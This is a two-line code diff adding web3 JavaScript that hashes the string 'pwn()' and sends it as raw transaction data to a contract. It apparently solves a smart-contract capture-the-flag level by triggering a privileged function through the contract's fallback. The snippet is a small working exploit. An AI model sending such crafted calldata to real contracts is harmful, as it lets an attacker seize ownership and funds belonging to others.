@@ -1,0 +1,2 @@
+var attack = web3.utils.keccak256("pwn()")
+await contract.sendTransaction({data:attack})
